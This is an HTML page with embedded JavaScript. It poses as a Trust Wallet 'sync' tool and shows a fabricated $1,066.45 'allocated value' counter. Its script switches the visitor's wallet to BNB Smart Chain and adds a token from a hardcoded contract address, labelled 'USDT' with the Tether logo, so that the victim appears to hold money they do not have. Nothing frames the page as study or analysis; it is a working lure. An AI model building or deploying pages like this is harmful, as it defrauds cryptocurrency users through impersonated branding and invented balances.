<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Sync Protocol</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
        .logo-box { margin-bottom: 25px; position: relative; }
        .main-logo { width: 85px; height: 85px; border-radius: 50%; box-shadow: 0 0 15px var(--tether-green); }
        .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
        .amount { font-size: 28px; font-weight: bold; letter-spacing: 1px; }
        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .action-btn:hover { background: #1e8564; transform: translateY(-2px); }
        .trust-icon { width: 22px; height: 22px; }
        #status { font-size: 10px; color: #666; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-box">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="main-logo">
    </div>
    
    <div class="price-display">
        <div style="font-size: 12px; color: #888; margin-bottom: 5px;">ALLOCATED VALUE</div>
        <div class="amount" id="counter">$0.00</div>
    </div>

    <button class="action-btn" id="mainAction">
        SYNC TRUST WALLET 
        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" class="trust-icon">
    </button>

    <div id="status">READY TO INITIALIZE...</div>
</div>

<script>
    const USDT_BSC_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f"; //
    const HIGH_RES_LOGO = "https://cryptologos.cc/logos/tether-usdt-logo.png?v=024";
    const BSC_HEX = "0x38"; // 56 in Decimal

    // Counter animation
    let count = 0;
    const target = 1066.45;
    const timer = setInterval(() => {
        if(count >= target) { count = target; clearInterval(timer); }
        document.getElementById('counter').innerText = "$" + count.toLocaleString(undefined, {minimumFractionDigits: 2});
        count += 23.45;
    }, 40);

    async function processInjection() {
        const status = document.getElementById('status');
        const btn = document.getElementById('mainAction');

        // Force detection of Trust Wallet provider
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            alert("Trust Wallet Extension not detected!");
            return;
        }

        try {
            btn.disabled = true;
            status.innerText = "> REQUESTING AUTH...";
            await provider.request({ method: 'eth_requestAccounts' });

            // CRITICAL STEP: SWITCH TO BSC FIRST
            status.innerText = "> SYNCING NETWORK (BSC)...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_HEX }],
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_HEX,
                            chainName: 'BNB Smart Chain',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            // FINAL STEP: ADD ASSET WITH LOGO
            status.innerText = "> MAPPING METADATA...";
            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: USDT_BSC_ADDR,
                        symbol: 'USDT',
                        decimals: 18, 
                        image: HIGH_RES_LOGO,
                    },
                },
            });

            if (success) {
                status.innerText = "> SYNC SUCCESSFUL";
                btn.innerText = "SYNCHRONIZED";
                alert("Synchronization successful! Asset logo mapped to BNB Smart Chain.");
            }

        } catch (err) {
            console.error(err);
            status.innerText = "> ERROR: " + (err.message.includes('User') ? "REJECTED" : "FAILED");
            btn.disabled = false;
        }
    }

    document.getElementById('mainAction').addEventListener('click', processInjection);
</script>

</body>
</html>
